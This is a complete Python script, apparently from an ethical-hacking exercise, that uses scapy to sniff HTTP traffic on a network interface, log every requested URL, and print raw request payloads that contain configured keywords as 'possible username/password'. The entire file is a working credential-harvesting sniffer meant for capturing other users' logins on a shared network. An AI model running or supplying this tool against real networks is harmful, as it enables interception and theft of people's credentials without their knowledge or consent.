#!/usr/bin/env python
import argparse

import scapy.all as scapy
from scapy.layers import http


# pip install scapy_http

def sniff(interface, keywords):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet(keywords))


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet, keywords):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        for keyword in keywords:
            if keyword.encode() in load:
                return load


def process_sniffed_packet(keywords):
    def inner(packet):
        if packet.haslayer(http.HTTPRequest):
            print(f"[+] HTTP request >> {get_url(packet)}")
            login_info = get_login_info(packet, keywords)
            if login_info:
                print(f"\n\n[+] Possible username/password > {login_info}\n\n")

    return inner


def read_props(prop_file):
    return dict(l.rstrip().split('=') for l in open(prop_file) if "=" in l and not l.startswith("#"))


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff its packets")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface, use --help for more info")
    return options


props = read_props("./app.properties")
keywords = props["keywords"].split(",")
print(f"Loaded keywords: {keywords}")

options = get_arguments()

sniff(options.interface, keywords)
